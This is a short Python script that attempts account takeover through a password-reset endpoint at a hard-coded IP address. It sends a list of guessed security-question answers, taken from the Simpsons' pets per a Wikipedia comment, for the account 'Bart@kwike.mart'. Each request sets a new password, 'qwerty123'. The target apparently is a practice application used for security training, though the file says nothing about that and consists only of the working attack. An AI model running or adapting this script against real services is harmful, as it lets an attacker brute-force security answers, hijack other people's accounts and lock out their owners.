import json

import requests

s = requests.Session()
# https://en.wikipedia.org/wiki/Simpson_family#Other_pets
# answers = ["Laddie", "laddie", "Santa's Little Helper", "Snowball II", "Snowball"]
answers = ["Santa's Little Helper", "Strangles", "Stampy", "Duncan", "Chirpy Boy", "Bart Junior", "Lou"]

for answer in answers:
    data = {"email": "Bart@kwike.mart", "answer": answer, "new": "qwerty123", "repeat": "qwerty123"}
    data_json = json.dumps(data)
    headers = {'Content-type': 'application/json'}

    r = s.post('http://43.241.202.33:3003/rest/user/reset-password',
               data=data_json,
               headers=headers,
               )
    print(r)
